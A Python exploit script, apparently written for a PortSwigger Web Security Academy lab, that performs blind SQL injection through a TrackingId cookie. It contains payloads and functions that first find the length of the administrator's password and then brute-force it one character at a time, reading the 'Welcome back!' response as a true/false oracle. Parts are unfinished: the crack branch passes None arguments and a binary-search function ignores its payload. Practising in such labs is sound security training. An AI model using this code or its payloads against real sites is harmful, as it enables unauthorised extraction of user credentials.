#!/usr/bin/env python3

import requests
import urllib3
from sys import argv
from urllib import parse
import string




'''
Comments

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

' and SELECT IF(ASCII(SUBSTRING('SQL Tutorial', 1, 1))>100, "yes",  False) --
BinarySearchPayload = " 'AND ( SELECT 'a' FROM users WHERE username='administrator' IF(LENGTH(password))>{NUM}, "yes",  False) ) --"
LowPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
HighPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
EquelPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={num})='a
LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
crakPayload = 'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}

def tryPayload(TargetUrl):
    while True:
        payload = input("Enter input: ")
        if payload == "stop":
            break
        else:
            TargetUrl = TargetUrl+payload
            statusCode = sendRequest(TargetUrl)
            print(statusCode[1])


'''

# diable disable_warnings if thir is proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# change it manuale 
SiteCookies = {'TrackingId': '6PcBBfx7XAa2A5Ml' , 'session':'bxB7panN6K3JCvkdKxelpyMGUki6HrRu'}

TargetUrl=argv[1]

# ================================= Functions ================================= #

# return list [ text of respone , status coe ]
# defualt value their is no cookies or proxies
def sendRequest(TargetUrl , proxies=None , cookies=None):
    try :
        result = requests.get(TargetUrl ,  cookies=cookies , proxies=proxies, verify=False )
        return [result.text,result.status_code]
    except:
        print("error")

# encode the payload [URL ENCODE]
def encodePayload(payload):
    return parse.quote(payload)

def NormalfindLength(TargetUrl,payload,maxLength=50):
    for i in range(maxLength):
        # Edit the value of the cookie to set the payload in it 
        SiteCookies["TrackingId"] = "XPjXEAnLufZXZ5sH" + encodePayload(payload.format(num=i))
        #print(SiteCookies["TrackingId"])
        
        # send the request with cookies after puting the dynamic payload 
        status = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
        
        if status : 
            # print status code of the response
            print(status[1],end=" ")
            if "Welcome back!" in status[0]:
                print("Moer than: " , i) # This means the condition is True
            else:
                print("Done password Length is: " , i)
                break    
        else:
            print("error")

def BruteForceCrackPassword(TargetUrl,start,end, wordlist , payload ):
    result = []
    for i in range(start,end):
        for a in wordlist:
            # Edit the value of the cookie to set the payload in it 
            SiteCookies["TrackingId"] = "6PcBBfx7XAa2A5Ml" + encodePayload(payload.format(num=i,letter=a))
            #print(SiteCookies["TrackingId"])
            
            # send the request with cookies after puting the dynamic payload 
            status = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
            
            if status : 
                # print status code of the response
                print(status[1],"- index of letter: ",a,"Letter:",i , sep=" ")
                if "Welcome back!" in status[0]:
                    result.append(a) # This means the condition is True
                    print("Letter:",a, "found in:" , i , sep=" ")
                    break
                else:
                    print("Index:" , i, "is Not:", a,sep=" ")           
            else:
                print("error")

    passwod = "".join(str(i) for i in result)
    print(passwod)


def binarySearch(array , num , low , high):
    
    BinarySearchPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")

    # Repeat until the pointers low and high meet each other
    while low <= high:

        mid = low + (high - low) // 2

        if array[mid] == num:
            return mid
        elif array[mid] < num:
            low = mid + 1
        else:
            high = mid - 1
    return -1




# ================================= Functions ================================= #


# ================================= Main ================================= #


if __name__ == '__main__':
    crakPayload = "'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}"
    LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
    if argv[2] == "length":
        length= int(input("Enter max length: "))
        NormalfindLength(TargetUrl,LengthPayload,maxLength=length)
    elif argv[3] == "crack":
        # None till i make argv
        BruteForceCrackPassword(TargetUrl,start=None,end=None,wordlist=None,payload=None)
    else:
        print("use length or crack")
